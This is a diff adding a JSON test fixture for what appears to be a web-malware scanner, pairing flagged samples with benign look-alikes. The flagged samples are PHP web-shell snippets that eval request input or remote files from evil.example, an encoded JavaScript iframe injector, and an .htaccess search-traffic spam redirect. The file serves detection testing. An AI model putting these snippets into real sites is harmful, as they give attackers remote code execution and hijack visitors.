@@ -1,0 +1,26 @@
+{
+  "positive": {
+    "pack-eval-concat-name": [{"ext": ".php", "text": "<?php\n$f = 'ev' . 'al';\n$f($_POST['x']);\n"}],
+    "pack-eval-php-input": [{"ext": ".php", "text": "<?php\n@eval(file_get_contents('php://input'));\n"}],
+    "pack-eval-remote": [{"ext": ".php", "text": "<?php\neval(file_get_contents('http://evil.example/payload.txt'));\n"}],
+    "pack-include-remote": [{"ext": ".php", "text": "<?php\ninclude('https://evil.example/shell.txt');\n"}],
+    "pack-upload-to-request-path": [{"ext": ".php", "text": "<?php\nmove_uploaded_file($_FILES['f']['tmp_name'], $_POST['path']);\n"}],
+    "pack-callback-request": [{"ext": ".php", "text": "<?php\narray_map($_REQUEST['cb'], array($_REQUEST['arg']));\n"}],
+    "pack-callback-danger": [{"ext": ".php", "text": "<?php\narray_map('assert', array($_GET['c']));\n"}],
+    "pack-usort-request": [{"ext": ".php", "text": "<?php\nusort($arr, $_GET['f']);\n"}],
+    "pack-fake-gif-php": [{"ext": ".php", "text": "GIF89a;<?php echo 1; ?>\n"}],
+    "pack-known-shell-names": [{"ext": ".php", "text": "<?php /* p0wny shell */ echo 1;"}],
+    "pack-js-eval-atob": [{"ext": ".js", "text": "eval(atob('ZG9jdW1lbnQud3JpdGUoJzxpZnJhbWUgc3JjPWh0dHA6Ly9ldmlsLmV4YW1wbGUvaWQ+PC9pZnJhbWU+Jyk7ZG9jdW1lbnQud3JpdGUoJzxpZnJhbWUgc3JjPWh0dHA6Ly9ldmlsLmV4YW1wbGU='));"}],
+    "pack-htaccess-search-redirect": [{"ext": ".htaccess", "text": "RewriteEngine On\nRewriteCond %{HTTP_REFERER} .*(google|yahoo|bing).*\nRewriteRule ^(.*)$ http://spam.example/in.php [R=302,L]\n"}]
+  },
+  "negative": [
+    {"ext": ".php", "text": "<?php\n// $f = 'ev' . 'al'; закомментировано: ничего не выполняет\n"},
+    {"ext": ".php", "text": "<?php\n$files = array_map('sanitize_text_field', (array) $_POST['ids']);\nusort($rows, 'cmp_names');\n"},
+    {"ext": ".php", "text": "<?php\n$data = file_get_contents('https://api.example.com/v1/items');\n$x = json_decode($data, true);\n"},
+    {"ext": ".php", "text": "<?php\nif (move_uploaded_file($_FILES['f']['tmp_name'], $target)) { echo 'ok'; }\n"},
+    {"ext": ".js", "text": "var s = atob('aGVsbG8gd29ybGQ=');\nconsole.log(s);\n"},
+    {"ext": ".htaccess", "text": "RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule . /index.php [L]\n"},
+    {"ext": ".htaccess", "text": "# RewriteCond %{HTTP_REFERER} google\n# RewriteRule ^(.*)$ http://spam.example/ [L]\n"},
+    {"ext": ".html", "text": "<iframe src=\"https://www.googletagmanager.com/ns.html?id=GTM-X\" height=\"0\" width=\"0\" style=\"display:none\"></iframe>\n"}
+  ]
+}
